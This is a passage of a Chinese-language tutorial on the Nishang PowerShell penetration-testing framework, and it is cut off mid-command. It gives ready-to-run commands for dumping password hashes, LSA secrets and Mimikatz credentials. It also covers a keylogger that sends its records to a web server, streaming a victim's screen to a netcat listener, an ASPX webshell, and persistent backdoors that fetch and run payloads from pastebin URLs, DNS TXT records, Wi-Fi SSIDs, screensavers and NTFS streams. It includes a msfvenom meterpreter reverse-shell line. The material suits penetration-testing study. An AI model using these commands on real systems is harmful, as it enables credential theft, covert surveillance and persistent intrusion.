class="brush:plain;toolbar:false">FireBuster&nbsp;192.168.199.1&nbsp;90-110&nbsp;-Verbose</pre><p style="text-align:center"><img src="http://p3.qhimg.com/t017fd490758d1b93f0.jpg" title="t01b5213809308e427a.jpg" alt="http://p0.qhimg.com/t01b5213809308e427a.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Get-Information</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本可以获取目标机器上大量的信息（FTP访问，进程，计算机配置信息，无线网络和设备的信息，Hosts信息等等非超丰富）。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Get-Information</pre><p style="text-align:center"><img src="http://p0.qhimg.com/t01f25be5baee48e1d0.jpg" title="t010d6feb1a3c405e6a.jpg" alt="http://p4.qhimg.com/t010d6feb1a3c405e6a.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还可以用我们前面说过的Out-File来将运行结果保存到指定文件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Get-LSASecret</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该脚本可以获取LSA信息，但是使用的前提当然是你已经成功提升了权限的情况下，通常和我们后面提权当中涉及到的Enable-DuplicateToken（帮助我们获得System权限）联合使用。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Enable-DuplicateToken
PS&nbsp;&gt;&nbsp;Get-LsaSecret
PS&nbsp;&gt;&nbsp;Get-LsaSecret&nbsp;-RegistryKey&nbsp;KeyName&nbsp;//还可以指定键名</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Get-PassHashes</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Get-PassHashes&nbsp;-PSObjectFormat&nbsp;//可以使用-PSObjectFormat来格式化输出结果</pre><p style="text-align:center"><img src="http://p1.qhimg.com/t014a298b31f2bda3a5.jpg" title="t01be58eee4d7e09c5d.jpg" alt="http://p5.qhimg.com/t01be58eee4d7e09c5d.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Get-WLAN-Keys</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在Administrator的权限下，可以利用这个脚本来dump出WLAN文件的密钥信息。实质上，这个脚本就是利用了netsh wlan show profile name=”” key=clear来获取。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Get-WLAN-Keys</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Keylogger</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Keylogger可以保存下用户的键盘记录。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;.\Keylogger.ps1&nbsp;-CheckURL&nbsp;http://pastebin.com/raw.php?i=jqP2vJ3x&nbsp;-MagicString&nbsp;stopthis&nbsp;&nbsp;//-CheckURL参数会去检查所给出的网页之中是否包含&nbsp;-MagicString后的字符串，如果存在的话就停止使用记录。
PS&nbsp;&gt;&nbsp;.\Keylogger.ps1&nbsp;-CheckURL&nbsp;http://pastebin.com/raw.php?i=jqP2vJ3x&nbsp;-MagicString&nbsp;stopthis&nbsp;-exfil&nbsp;-ExfilOption&nbsp;WebServer&nbsp;-URL&nbsp;http://192.168.254.226/data/catch.php&nbsp;//将记录指定发送给一个可以记录Post请求的Web服务器
PS&nbsp;&gt;&nbsp;.\Keylogger.ps1&nbsp;-persist&nbsp;//实现持久化记录（重启后依然进行记录）
PS&nbsp;&gt;&nbsp;.\Keylogger.ps1&nbsp;//直接以这种方式来运行，键盘记录会保存在当前用户的Temp目录下key文件中</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">测试&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先执行 PS &gt; .\Keylogger.ps1</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t0125efdaa308e3ef3f.jpg" title="t01a15eeb50aecf23d6.jpg" alt="http://p1.qhimg.com/t01a15eeb50aecf23d6.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">发现在当前用户的Temp目录下生成了Key的文件，这时我们使用nishang Utility中的Parse_Keys来解析</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Parse_Keys&nbsp;.\key.log&nbsp;.\parsed.txt</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后parsed.txt里面就是解析后的按键记录了</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01032c3b1a764d9750.jpg" title="t010484abdcf764db43.jpg" alt="http://p6.qhimg.com/t010484abdcf764db43.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Invoke-MimikatzWdigestDowngrade</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Dump出Windows 8.1 and Server 2012的系统用户密码。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Invoke-MimikatzWDigestDowngrade
PS&nbsp;&gt;&nbsp;Get-Job&nbsp;|&nbsp;Receive-Job</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">执行了</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Invoke-MimikatzWDigestDowngrade</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Windows会锁屏</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01b5ddf5ed38cb4df7.jpg" title="t01ca15a4ca59079514.jpg" alt="http://p2.qhimg.com/t01ca15a4ca59079514.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后执行</span></p><pre class="brush:plain;toolbar:false">Get-Job</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">发现尝试多次都测试失败</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01c2a88448dc74541a.jpg" title="t01c3b609b3cb7c9930.jpg" alt="http://p3.qhimg.com/t01c3b609b3cb7c9930.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">解决办法可以参考：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><a href="http://www.myhack58.com/Article/html/3/62/2016/75903.htm" target="_blank" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0); text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">[域渗透——Dump Clear-Text Password after KB2871997 installed]</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Get-PassHints</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本可以从Windows获得用户的密码的提示信息，需要有Administrator的权限来读取SAM hive。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Get-PassHints</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Show-TargetScreen</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用MJPEG传输目标机器的远程桌面的实时画面，在本机我们可以使用NC或者Powercat来进行监听。在本地使用支持MJPEG的浏览器（如：Firefox）访问本机对应监听端口，即可在浏览器上面看到远端传输回来的实时画面。</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Show-TargetScreen&nbsp;-Reverse&nbsp;-IPAddress&nbsp;192.168.230.1&nbsp;-Port&nbsp;443&nbsp;&nbsp;//将远程的画面传送到192.168.230.1的443端口</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">测试&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Victim：</span></p><pre class="brush:plain;toolbar:false">Show-TargetScreen&nbsp;-IPAddres&nbsp;192.168.199.127&nbsp;-Port&nbsp;5773&nbsp;-Reverse</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Attacker：</span></p><pre class="brush:plain;toolbar:false">nc.exe&nbsp;-nlvp&nbsp;5773&nbsp;|&nbsp;nc.exe&nbsp;-nlvp&nbsp;9000&nbsp;//这里我使用的NC，也可以用Powercat</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">本机访问：127.0.0.1:9000</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01852a189eaf71620e.jpg" title="t016ade56c6c650bc2e.jpg" alt="http://p2.qhimg.com/t016ade56c6c650bc2e.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Invoke-Mimikatz</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Mimikatz大家都非常熟悉了，就不再介绍了&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">Invoke-Mimikatz&nbsp;-DumpCerts&nbsp;//Dump出本机的凭证信息
Invoke-Mimikatz&nbsp;-DumpCreds&nbsp;-ComputerName&nbsp;@(&quot;computer1&quot;,&nbsp;&quot;computer2&quot;)&nbsp;//Dump出远程两台计算机的凭证信息
Invoke-Mimikatz&nbsp;-Command&nbsp;&quot;privilege::debug&nbsp;exit&quot;&nbsp;-ComputerName&nbsp;&quot;computer1&quot;&nbsp;//在远程一台机器上运行Mimikatz并执行&quot;privilege::debug&nbsp;exit&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">1.域相关脚本</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Get-Unconstrained</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">查找域内开启了Kerberos Unconstrained Delegation的机器。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Get-Unconstrained&nbsp;//返回开启的计算机名
PS&nbsp;&gt;&nbsp;Get-Unconstrained&nbsp;-Details&nbsp;&nbsp;//返回更详细的信息</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">关于”通过Kerberos Unconstrained Delegation获取到域管理员”：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://www.freebuf.com/articles/terminal/98530.html" _src="http://www.freebuf.com/articles/terminal/98530.html">http://www.freebuf.com/articles/terminal/98530.html</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.Antak Webshell</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Antak</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一个ASPX的Webshell，通过这个Webshell可以编码、执行脚本，上传、下载文件。&nbsp;</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t012e1da54c6c4e3697.png" title="t01d433e9d1efbcd1bb.png" alt="http://p6.qhimg.com/t01d433e9d1efbcd1bb.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">上传Webshell后把它当成一个正常的Powershell执行窗口来使用
上传和下载文件，只需要填写好对应路径点击上传、下载按钮即可</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">关于Antak Webshell的更多介绍，请参考：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://www.labofapenetrationtester.com/2014/06/introducing-antak.html" _src="http://www.labofapenetrationtester.com/2014/06/introducing-antak.html">http://www.labofapenetrationtester.com/2014/06/introducing-antak.html</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.后门</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">HTTP-Backdoor</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">HTTP-Backdoor可以帮助我们在目标机器上下载和执行Powershell脚本&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;HTTP-Backdoor&nbsp;-CheckURL&nbsp;http://pastebin.com/raw.php?i=jqP2vJ3x&nbsp;-PayloadURL&nbsp;http://pastebin.com/raw.php?i=Zhyf8rwh&nbsp;-Arguments&nbsp;Get-Information&nbsp;-MagicString&nbsp;start123&nbsp;-StopString&nbsp;stopthis</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">下面解释下几个比较重要的参数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">CheckURL&nbsp;给出一个URL地址，如果存在我们MagicString中的值就去执行Payload&nbsp;-&nbsp;下载运行我们的脚本
PayloadURL&nbsp;这个参数给出我们需要下载的Powershell脚本的地址
Arguments&nbsp;这个参数指定我们要执行的函数
StopString&nbsp;这个参数也会去看是否存在我们CheckURL返回的字符串，如果存在就会停止执行</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">DNS_TXT_Pwnage</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">利用DNS隧道来进行信息传输、通信的小技巧已经不少见了。在Nishang中也集成了一个通过DNS TXT来接收命令或者脚本的后门脚本。使用DNS_TXT_Pwnage这个脚本，我们一般需要配合Utility下的Out-DnsTxt使用。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以这里首先说下Out-DnsTxt的使用：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Out-DnsTxt&nbsp;-DataToEncode&nbsp;path&nbsp;//path处是你想编码的内容的路径</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">之后，它会生成一个编码后的文件，如下图所示</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01a52d3fa454ec8307.jpg" title="t01bee5299c255b52cd.jpg" alt="http://p8.qhimg.com/t01bee5299c255b52cd.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后我们去添加对应的TXT记录就行了，encoded.txt文件中每一行为一条记录&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">添加完后我们还需要添加两条TXT记录，内容为start和stop&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">添加完成后，我们就可以利用DNS_TXT_Pwnage这个脚本了&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;DNS_TXT_Pwnage&nbsp;-startdomain&nbsp;start.test.com&nbsp;-cmdstring&nbsp;start&nbsp;-commanddomain&nbsp;command.test.com&nbsp;-psstring&nbsp;test&nbsp;-psdomain&nbsp;xxx.test.com&nbsp;-Subdomains&nbsp;1&nbsp;-StopString&nbsp;stop</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">具体参数的意思：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">startdomain&nbsp;会一直去检测我们指定域名的TXT记录，并把返回的记录与我们输入的cmdstring以及psstring进行比较
cmdstring&nbsp;是我们任意输入的字符串，如果startdomain与我们这里输入的cmdstring值相等则执行commanddomain命令
commanddomain&nbsp;创建的执行命令TXT记录的域名
psstring&nbsp;是我们任意输入的字符串，如果与我们这里输入的psstring值相等则执行psdomain脚本
psdomain&nbsp;是我们创建的执行脚本TXT记录的域名
Subdomains&nbsp;是执行脚本创建TXT记录的个数
StopString&nbsp;是任意输入的字符串，如果这里输入的字符串与startdomain中返回的记录相同将会停止执行我们的Payload
Arguments&nbsp;指定要执行的函数名</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Execute-OnTime</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Execute-OnTime&nbsp;-PayloadURL&nbsp;http://pastebin.com/raw.php?i=Zhyf8rwh&nbsp;-Arguments&nbsp;Get-Information&nbsp;-Time&nbsp;hh:mm&nbsp;-CheckURL&nbsp;http://pastebin.com/raw.php?i=Zhyf8rwh&nbsp;-StopString&nbsp;stoppayload</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">具体参数的意思：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PayloadURL&nbsp;指定我们脚本下载的地址
Arguments&nbsp;指定执行的函数名
Time&nbsp;参数可以设定脚本执行的时间（例如&nbsp;-Time&nbsp;23:21）
CheckURL&nbsp;参数会检测我们一个指定的URL内容是否存在StopString给出的字符串，如果发现了就停止执行</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Gupt-Backdoor</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Gupt-Backdoor这个脚本可以帮助我们通过无线SSID反弹后门和执行命令。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Gupt-Backdoor&nbsp;-MagicString&nbsp;test&nbsp;-Verbose</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里解释一下MagicString这个参数：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">MagicString开头的4个字符是用来识别我们建立的WIFI SSID的。例如，这里是test，Gupt后门会去自动匹配我们WIFI中SSID以test开头的。而MagicString这个参数从第五个字符开始就决定了我们是执行命令或是下载脚本。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">需要注意的是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果它的第五个字符是c就代表执行命令。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如：-MagicString testcwhoami&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">就会匹配WIFI SSID为test的，并执行命令whoami</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果它的第五个字符是u的话就代表下载脚本。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如：-MagicString testuXXXX&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">就会匹配WIFI SSID为test的，并默认下载http://goo.gl/XXXX&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（其中http://goo.gl可在脚本的$PayloadURL参数中修改）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还可以用Arguments参数来指定下载脚本&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PS &gt;Gupt-Backdoor -MagicString test -Argument Get-Information -Verbose&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">就可以下载Get-Information的脚本了</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">补充&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Windows下创建一个WIFI：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">cmd
netsh&nbsp;wlan&nbsp;set&nbsp;hostednetwork&nbsp;mode=allow
netsh&nbsp;wlan&nbsp;set&nbsp;hostednetwork&nbsp;ssid=test&nbsp;key=1234567890
netsh&nbsp;wlan&nbsp;start&nbsp;hostednetwork</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Add-ScrnSaveBackdoor</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本可以帮助我们利用Windows的屏保来留下一个隐藏的后门&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Add-ScrnSaveBackdoor&nbsp;-Payload&nbsp;&quot;powershell.exe&nbsp;-ExecutionPolicy&nbsp;Bypass&nbsp;-noprofile&nbsp;-noexit&nbsp;-c&nbsp;Get-Process&quot;&nbsp;//使用这条语句可以执行我们自己的Payload
PS&nbsp;&gt;Add-ScrnSaveBackdoor&nbsp;-PayloadURL&nbsp;http://192.168.254.1/Powerpreter.psm1&nbsp;-Arguments&nbsp;HTTP-Backdoor&nbsp;
http://pastebin.com/raw.php?i=jqP2vJ3x&nbsp;http://pastebin.com/raw.php?i=Zhyf8rwh&nbsp;start123&nbsp;stopthis&nbsp;//利用这条命令可以从powershell执行一个HTTP-Backdoor
PS&nbsp;&gt;Add-ScrnSaveBackdoor&nbsp;-PayloadURL&nbsp;http://192.168.254.1/code_exec.ps1&nbsp;&nbsp;//还可以使用msfvenom先生成一个powershell&nbsp;(./msfvenom&nbsp;-p&nbsp;windows/x64/meterpreter/reverse_https&nbsp;LHOST=192.168.254.226&nbsp;-f&nbsp;powershell)，然后利用这条命令返回一个meterpreter</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">其他具体的参数的意思和我们上面介绍的一些后门是类似的</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PayloadURL&nbsp;指定我们需要下载的脚本地址
Arguments&nbsp;指定我们要执行的函数以及相关参数</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 176, 80);">Invoke-ADSBackdoor</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本是使用NTFS数据流留下一个永久性后门。其实，由NTFS数据流带来的一些安全问题的利用并不少见了（如：利用NTFS数据流在Mysql UDF提权中创建lib/plugin目录），大家可以参考《NTFS ADS带来的WEB安全问题》&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本可以向ADS中注入代码并且以普通用户权限运行&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;Invoke-ADSBackdoor&nbsp;-PayloadURL&nbsp;http://192.168.254.1/Powerpreter.psm1&nbsp;-Arguments&nbsp;HTTP-Backdoor&nbsp;&quot;http://pastebin.
